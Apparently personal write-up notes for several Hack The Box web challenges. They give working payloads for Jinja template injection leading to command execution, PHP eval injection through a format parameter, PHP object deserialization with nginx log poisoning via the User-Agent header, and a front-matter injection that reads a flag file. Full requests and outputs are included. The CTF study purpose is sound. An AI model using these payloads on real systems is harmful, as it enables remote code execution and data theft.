# blinker fluids htb


examining the code we can see in the docker file

```
# Add flag
COPY flag.txt /flag.txt
```
and we see a fake flag for testing as well.

while creating pdf we see

```
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 

```
https://heinandre.no/htb-cyber-apocalypse-2022/web/blinker-fluids/

first we look at the databases and imports.
we see any templating engine then we can try and inject.

while trying iframe injection I was able to inject an iframe but no flag text file still.


```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt')}"; display: block }`,
}
---

```
HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}

# templated htb

when we go to http://159.65.58.189:31882/

we can see that site is still under construction and uses jinja templates

so straight away template injection comes to mind.

but need to run dirbuster to get to any good sites.

https://ireadyoulearn.info/2021/06/19/server-side-template-injection-hack-the-box-walkthrough/

trying with /config

```
Error 404

The page '<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>' could not be found
```

```
{{''.__class__.__mro__[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}

# phonebook

after doing passwird bruteforcing it worked.

# gunship

while looking at the code I could see the line 

`pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })`

maybe if instead of 'guest we can put something else?

AST injection was the original hint in one of the comments in the machine

looking at AST injection

# sanitize

sql injection in 
HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}

# Lovetok

the time changes everytime hte page is refreshed

we see inside entrypoint.sh

`FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
`
will give out random numbers

```
~/Downloads/web_lovetok ⌚ 13:03:55
$ cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1

Sz0Ir

```

The website handles all request path

function for time

```
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

Eval is the vulnerability, however you see the addslashes. looking at the net for addslashes we found.

?format=${phpinfo()} if we add to the url it works

you can enumerate th edirectory by : http://206.189.20.127:31160/?format=${system($_GET[1])}&1=ls+/

th flag will be at : http://157.245.33.77:32397/?format=${system($_GET[1])}&1=cat+flagwGg4C

not getting flags anymore though
https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/

# TOXIC

The entire structure is similar to lovetok.

The page itself is static.

in index.php we find

```php
<?php

spl_autoload_register(function ($name){

    if (preg_match('/Model$/', $name))

    {

        $name = "models/${name}";

    }

    include_once "${name}.php";

});



if (empty($_COOKIE['PHPSESSID']))

{

    $page = new PageModel;

    $page->file = '/www/index.html';



    setcookie(

        'PHPSESSID', 

        base64_encode(serialize($page)), 

        time()+60*60*24, 

        '/'

    );

} 



$cookie = base64_decode($_COOKIE['PHPSESSID']);

unserialize($cookie);


```

and in page model

```php
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

the page handle anything

I can see it makes a phpssied cookie though

can we make it load malicous cookie?

```
PHPSESSID:"Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"
```

after decoding it we found

O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

now we can put in any page inside it

Request sent to get /var/log/nginx/access.log

request:

```
GET /? HTTP/1.1


Host: 134.209.17.29:32259


User-Agent: <?php system('ls /');?>


Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8


Accept-Language: en-US,en;q=0.5


Accept-Encoding: gzip, deflate


DNT: 1


Connection: close


Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==


Upgrade-Insecure-Requests: 1


Cache-Control: max-age=0



```


output: 

```
HTTP/1.1 200 OK

Server: nginx

Date: Wed, 13 Jul 2022 18:00:57 GMT

Content-Type: text/html; charset=UTF-8

Connection: close

X-Powered-By: PHP/7.4.15

Content-Length: 5698



134.209.17.29 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/css/production.css HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/js/production.js HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/flask.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/bucket.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/instagram.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/facebook.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/twitter.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/youtube.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/aircraft.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan2.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/dart-frog.jpg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan5.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan3.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan1.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan4.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan6.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/favicon.ico HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET / HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/js/production.js HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /asdsf HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/facebook.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/twitter.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/instagram.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /favicon.ico HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "bin
dev
entrypoint.sh
etc
flag_Wqgfs
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
" 
```


O:9:"PageModel":1:{s:4:"file";s:25:"/flag_Wqgfs";}

and add the user agent as :

<?php system('cat flag_Wqgfs');?>

HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}




